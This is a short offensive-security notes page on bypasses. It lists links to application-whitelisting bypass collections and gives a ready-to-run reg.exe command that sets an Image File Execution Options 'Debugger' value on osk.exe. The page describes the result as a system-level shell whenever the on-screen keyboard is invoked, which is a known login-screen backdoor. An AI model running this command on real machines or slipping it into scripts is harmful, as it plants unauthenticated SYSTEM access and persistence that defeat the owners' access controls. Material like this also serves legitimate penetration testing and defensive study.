#Bypasses

## Application Whitelisting


[Application Whitelist Auditor - Airlock Digital](https://www.airlockdigital.com/application-whitelisting-auditor/)

[AllTheThings - SubTee](https://github.com/subTee/AllTheThings)

[Bypass Techniques - SubTee](https://github.com/subTee/ApplicationWhitelistBypassTechniques)

## Native Utilities

### Reg.exe

Create a registry entry on the host, allowing a system-level shell to be invoked any time that the osk.exe (on screen keyboard) process is called:

    reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f
